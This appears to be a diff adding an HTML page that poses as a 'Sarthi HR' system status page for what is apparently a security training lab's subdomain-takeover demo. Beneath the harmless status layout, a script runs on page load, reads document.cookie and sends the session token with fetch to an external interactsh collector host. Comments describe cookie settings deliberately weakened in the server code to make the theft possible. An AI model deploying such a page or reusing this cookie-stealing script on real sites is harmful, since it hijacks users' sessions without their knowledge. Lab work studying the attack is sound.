@@ -1,0 +1,45 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Sarthi HR — Status</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  body { font-family: -apple-system, Segoe UI, Roboto, Arial, sans-serif; background: #f8f9fc; color: #333; margin: 0; padding: 40px 20px; }
+  .card { max-width: 640px; margin: 0 auto; background: #fff; border-radius: 8px; padding: 32px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
+  h1 { font-size: 1.4rem; margin-top: 0; }
+  .ok { color: #1cc88a; font-weight: 600; }
+  .row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; font-size: 0.92rem; }
+</style>
+</head>
+<body>
+  <div class="card">
+    <h1>Sarthi HR — System Status</h1>
+    <div class="row"><span>Web app</span><span class="ok">● Operational</span></div>
+    <div class="row"><span>SAML SSO</span><span class="ok">● Operational</span></div>
+    <div class="row"><span>Notifications</span><span class="ok">● Operational</span></div>
+    <p style="margin-top:24px;font-size:0.8rem;color:#999;">No incidents reported in the last 90 days.</p>
+  </div>
+
+  <script>
+    // Exploit payload for the subdomain-takeover -> auth-bypass demo.
+    // This page is served from the CLAIMED dangling subdomain
+    // (status.sarthi.web.hackable.training). Because sarthi_auth's cookie
+    // Domain was widened to .sarthi.web.hackable.training and httpOnly was
+    // dropped (see web/server.js), document.cookie here includes the
+    // real session token for anyone whose browser has it set.
+    //
+    // Set this to the real interactsh domain printed by:
+    //   interactsh-client -http-only -v
+    // before pushing this file. Must be reachable over HTTP/HTTPS (the
+    // -http-only flag restricts interactsh to that protocol only).
+    const COLLECTOR = "dbbk2ks9g8r7gbfrcu80gkpsj9qbiuimz.oast.online";
+
+    const stolen = document.cookie;
+    if (stolen && !COLLECTOR.startsWith("REPLACE_WITH")) {
+      fetch("https://" + COLLECTOR + "/c?v=" + encodeURIComponent(stolen), { mode: "no-cors" })
+        .catch(() => {});
+    }
+  </script>
+</body>
+</html>
